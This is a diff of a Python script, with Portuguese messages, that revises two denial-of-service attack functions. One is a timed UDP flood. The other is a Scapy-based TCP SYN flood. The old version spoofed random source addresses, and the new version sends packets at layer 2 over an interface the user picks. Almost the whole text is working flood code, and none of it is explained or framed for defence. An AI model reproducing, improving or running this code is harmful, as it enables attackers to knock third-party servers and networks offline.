@@ -1,79 +1,76 @@
-import socket
 import random
-import time
 import sys
+import time
+import socket
+from scapy.all import IP, TCP, Ether, sendp, conf
 
-# Tenta importar o Scapy. Se falhar, o programa não crasha logo.
-try:
-    from scapy.all import IP, TCP, send, RandShort, RandIP
-    SCAPY_AVAILABLE = True
-except ImportError:
-    SCAPY_AVAILABLE = False
-
-# --- UDP FLOOD (Já existente) ---
 def udp_flood(target_ip, target_port, duration):
-    """
-    Envia pacotes UDP aleatórios (DoS).
-    """
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes_to_send = random._urandom(1024)
     timeout = time.time() + duration
-    sent_packets = 0
+    sent = 0
 
-    print(f"\n[*] A iniciar UDP Flood para {target_ip}:{target_port}")
-    print(f"[*] Duração: {duration}s. Ctrl+C para parar.")
+    print(f"[*] A iniciar UDP Flood em {target_ip}:{target_port} por {duration}s...")
+
+    while True:
+        if time.time() > timeout:
+            break
+        try:
+            client.sendto(bytes_to_send, (target_ip, target_port))
+            sent += 1
+            print(f"\r[*] Pacotes enviados: {sent}", end="")
+        except KeyboardInterrupt:
+            print("\n[!] Ataque interrompido.")
+            break
+        except Exception as e:
+            print(f"\n[!] Erro: {e}")
+            break
+    print("\n[*] Ataque UDP terminado.")
+
+def syn_flood(target_ip, target_port, count):
+    print("-" * 60)
+    print(f"[*] A preparar SYN Flood contra {target_ip}:{target_port}")
+    print("-" * 60)
+
+    # 1. MOSTRAR AS PLACAS DE REDE DISPONÍVEIS
+    print("--- Placas de Rede Detetadas ---")
+    print(conf.ifaces) # Mostra a lista no terminal
+    print("--------------------------------")
+    
+    # 2. PERGUNTAR QUAL USAR
+    print("[!] DICA: Escolha a interface que tem Internet (ex: 'Wi-Fi', 'Ethernet', 'Ethernet 2')")
+    print("[!] Procure na coluna 'Name' ou 'Description'.")
+    iface_name = input("Nome da Interface (copie da lista acima): ").strip()
+    
+    # 3. MAC ADDRESS
+    target_mac = input(f"MAC Address do Alvo (Enter para {target_ip}): ").strip()
+    if not target_mac:
+        print("[!] A tentar resolver MAC automaticamente...")
+    
+    print(f"\n[*] A enviar {count} pacotes pela interface '{iface_name}'...")
 
     try:
-        while time.time() < timeout:
-            client.sendto(bytes_to_send, (target_ip, target_port))
-            sent_packets += 1
-            if sent_packets % 1000 == 0:
-                print(f"\r[+] Pacotes enviados: {sent_packets}", end="")
-    except KeyboardInterrupt:
-        print("\n[!] Interrompido.")
+        for i in range(count):
+            ip_layer = IP(dst=target_ip)
+            tcp_layer = TCP(sport=random.randint(1024, 65535), 
+                            dport=target_port, 
+                            flags="S",
+                            seq=random.randint(1000, 9000))
+            
+            # Se tivermos MAC, usamos Ethernet (Layer 2)
+            if target_mac:
+                eth_layer = Ether(dst=target_mac)
+                packet = eth_layer / ip_layer / tcp_layer
+                sendp(packet, iface=iface_name, verbose=False)
+            else:
+                # Se não, tentamos Layer 3 forçando a interface
+                packet = ip_layer / tcp_layer
+                sendp(Ether()/packet, iface=iface_name, verbose=False) 
+
+            print(f"\r[*] Pacote {i+1}/{count} enviado...", end="")
+            
     except Exception as e:
         print(f"\n[!] Erro: {e}")
-    finally:
-        client.close()
-        print(f"\n[*] Total UDP enviados: {sent_packets}")
-
-# --- SYN FLOOD (Novo) ---
-def syn_flood(target_ip, target_port, num_packets):
-    """
-    Envia pacotes TCP SYN usando Scapy.
-    Requer privilégios de Administrador.
-    """
-    if not SCAPY_AVAILABLE:
-        print("\n[!] ERRO: A biblioteca 'scapy' não está instalada.")
-        print("Instale com: pip install scapy")
-        return
-
-    print(f"\n[*] A iniciar SYN Flood contra {target_ip}:{target_port}")
-    print(f"[*] Pacotes a enviar: {num_packets}")
-    print("[!] Nota: No Windows, pode ser necessário instalar o Npcap.")
+        print("[!] Verifique se escreveu o nome da Interface EXATAMENTE igual à lista (aspas não necessárias).")
     
-    count = 0
-    try:
-        for i in range(num_packets):
-            # Criação do Pacote
-            # IP: Origem falsa (RandIP) -> Destino Real
-            # TCP: Porto origem aleatório -> Porto destino Real | Flag S (SYN)
-            ip_layer = IP(src=str(RandIP()), dst=target_ip)
-            tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
-            packet = ip_layer / tcp_layer
-
-            # Envia o pacote (verbose=0 para não encher o ecrã)
-            send(packet, verbose=0)
-            
-            count += 1
-            if count % 10 == 0:
-                print(f"\r[+] Pacotes SYN enviados: {count}", end="")
-                
-    except KeyboardInterrupt:
-        print("\n[!] Ataque interrompido.")
-    except PermissionError:
-        print("\n[!] ERRO: É necessário correr o terminal como ADMINISTRADOR.")
-    except Exception as e:
-        print(f"\n[!] Erro no Scapy: {e}")
-    
-    print(f"\n[*] Ataque terminado. Total enviado: {count}")
+    print("\n[*] Ataque SYN terminado.")
